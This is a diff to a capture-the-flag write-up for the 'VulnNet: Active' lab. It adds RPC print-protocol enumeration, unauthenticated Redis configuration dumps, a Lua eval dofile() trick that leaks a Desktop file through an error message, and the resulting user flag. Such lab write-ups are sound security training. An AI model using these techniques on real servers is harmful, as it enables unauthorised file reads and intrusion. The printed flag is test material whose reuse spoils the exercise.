@@ -19,17 +19,12 @@ Icon made by <a href="https://www.freepik.com/">Freepik</a> from <a href="http:/
 
 <p><em>Answer the questions below</em></p>
 
-<p>1.1. What is the user flag? (Desktop\user.txt)<br>
-<code>________</code></p>
-
-<br>
-
 <p>1.2. What is the system flag? (Desktop\system.txt)<br>
 <code>________</code></p>
 
 <br>
 
-<h3>Nmap</h3>
+<h2>Nmap</h2>
 <p> 14 open ports:
 
 - &nbsp;&nbsp;&nbsp; <code>53</code> &nbsp; : &nbsp; DNS<br>
@@ -92,7 +87,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
-<h3>enum4linux</h3>
+<h2>enum4linux</h2>
 
 <p>
 
@@ -185,14 +180,36 @@ SMB1 disabled -- no workgroup available
 do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 ```
 
-<h3>crackmapexec smb</h3>
+<h2>crackmapexec smb</h2>
 
 ```bash
 :~/VulnNetActive# crackmapexec smb vulnnet.thm
 SMB         xx.xxx.xx.xx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
 ```
 
-<h3>Redis</h3>
+<h2>rpcdump</h2>
+
+```bash
+:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm > report
+```
+
+```bash
+:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | grep Print
+```
+
+<br>
+
+<img width="1092" height="153" alt="image" src="https://github.com/user-attachments/assets/0000e99c-8695-430d-8749-512b6cc1d2d0" />
+
+<br>
+
+```bash
+:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | egrep 'MS-RPRN|MS-PAR'
+Protocol: [MS-RPRN]: Print System Remote Protocol 
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+```
+
+<h2>Redis</h2>
 
 ```bash
 :~/VulnNetActive# apt install redis-tools
@@ -200,7 +217,17 @@ SMB         xx.xxx.xx.xx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763
 
 ```bash
 :~/VulnNetActive# redis-cli -h vulnnet.thm
-vulnnet.thm:6379> info
+vulnnet.thm:6379>
+```
+
+<br>
+
+<img width="1091" height="142" alt="image" src="https://github.com/user-attachments/assets/b750486e-2402-46a3-96d7-237fce0b9761" />
+
+<br>
+
+```bash 
+vulnnet.thm:6379> INFO
 # Server
 redis_version:2.8.2402
 redis_git_sha1:00000000
@@ -215,6 +242,68 @@ run_id:fd5deedf4803915e1c9d9977c607e834a7d47642
 ...
 ```
 
+<p>
+
+- C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402</p>
+
+
+```bash 
+vulnnet.thm:6379> CONFIG GET pidfile
+1) "pidfile"
+2) "/var/run/redis.pid"
+```
+
+```bash
+vulnnet.thm:6379> CONFIG GET dbfilename
+1) "dbfilename"
+2) "dump.rdb"
+3) ```
+```
+
+```bash
+vulnnet.thm:6379> CONFIG GET logfile
+1) "logfile"
+2) ""
+3) ```
+```
+
+```bash
+vulnnet.thm:6379> CONFIG GET dir
+1) "dir"
+2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
+3) ```
+```
+
+```bash
+vulnnet.thm:6379> CONFIG GET *
+  1) "dbfilename"
+  2) "dump.rdb"
+  3) "requirepass"
+  4) ""
+  5) "masterauth"
+...
+104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
+...
+```
+
+```bash
+vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
+```
+
+<br>
+
+<img width="1086" height="106" alt="image" src="https://github.com/user-attachments/assets/30437ddd-c49c-425c-8407-688916217194" />
+
+<br>
+
+<p>1.1. What is the user flag? (Desktop\user.txt)<br>
+<code>THM{3eb176aee96432d5b100bc93580b291e}</code></p>
+
+<br>
+
+<img width="768" height="189" alt="image" src="https://github.com/user-attachments/assets/f8e02cc4-f944-4615-b501-dc6ba2bb0fbc" />
+
 ```bash
 vulnnet.thm:6379> config get *
   1) "dbfilename"
@@ -227,12 +316,7 @@ vulnnet.thm:6379> config get *
 ...
 ```
 
-<br>
-
-<img width="768" height="189" alt="image" src="https://github.com/user-attachments/assets/f8e02cc4-f944-4615-b501-dc6ba2bb0fbc" />
-
-<br>
-<h3>searchploit</h3>
+<h2>searchploit</h2>
 <p>
 
 - researched <code>GitHub Redis 2.8.2402 exploit</code><br>
